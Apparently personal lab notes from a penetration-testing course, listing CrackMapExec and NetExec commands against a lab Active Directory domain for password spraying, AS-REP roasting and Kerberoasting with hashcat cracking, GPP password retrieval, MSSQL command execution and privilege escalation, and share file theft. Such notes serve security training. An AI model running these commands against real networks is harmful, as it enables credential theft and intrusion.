```
$ crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
```
%% get all hosts with smb signing disabled %%

```
$ crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export (pwd)/passpol.txt
```
%% enumerate password policy for hosts with null and export to current directory %%

```
$ sed -i "s/'/\"/g" users.txt
$ jq -r '.[]' users.txt > userslist.txt
$ cat userslist.txt
```
%% extract users list just replace --pass-pol  with --users or --shares %%

```
$ crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```
%%  no bruteforce option test first user with first password, second user with second password and so on  and continue on success option makes sure you test every account not just when successful login is found%%

```
$ crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
```
%% local auth option to test a local account instead of a domain account. Domain Controller does not have a local account, so we can't use --local-auth option against a DC%%

```
$ crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb
```
%% for local windows account. specify a dot(.) as domain option -d or target machine name also note that domain controllers do not have local admins %%

```
$ crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth
```
%% if we want to try an SQL account, use local-auth option. At times the MSSQL accounts have same name and password as AD Account %%

```
$ crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out
```
%% brute force for accounts vulnerable to ASREPRoasting which looks for users without kerberos pre-authentication required thus we can send an AS_REQ request to KDC on behalf of any of those users and receive an AS_REP message%%

```
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out
```
%% search for asreproastable accounts with valid credentials %%

```
$ hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
```
%% try and crack the hashes found %%

```
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc
```
%% retrieve user description using user-desc module . Display description that contains keywords key and pass saved to a log file%%

```
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
```
%% replace default keywords (key and pass) with the keywords pwd and admin%%

```
$ cd CrackMapExec/cme/modules/
$ wget https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modules/groupmembership.py -q
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
```
%% querying group membership with a custom module %%

```
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
```
%%  mssql queries to query database  using cme mssql  if you see Pwn3d while using local auth option then user is a DBA %%

```
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x whoami
```
%% if we are DBA we can enable xp_cmdshell to execute system commands. It does not mean we are local admins though %%

```
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
```
%% upload file to directory  with put file option %%

```
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
```
%% download file from target machine with get file and save it locally %%

```
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
```
%%  attempt to escalate to sysadminuser if you use ACTION=rollback then you remove the privileges assigned %%

```
$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password
```
%% retrieve plaintext password for accounts pushed through group policy preferences (GPP) %%

```
$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin
```
%% searches domain controller for registry.xml files to find autologin info and returns username and cleartext password %%

```
$  crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
```
%% check for kerberoastable accounts (accounts with an SPN linked to them) any  AD account can request a TGS for any SPN account %% 

```
$ hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
```
%% crack hash with hashcat if you get hashes %%

```
$  nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT --pattern txt
```
%%  spider to further enumerate shares and regex or pattern option for searching for files on the shares %%

```
$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT --content --regex Encrypt
```
%% find a file containing word encrypt %%

```
$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --get-file Creds.txt Creds.txt
```
%% retrieve a file in a shared folder %%

```
$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --put-file /etc/passwd passwd
```
%% add file to a shared folder %%

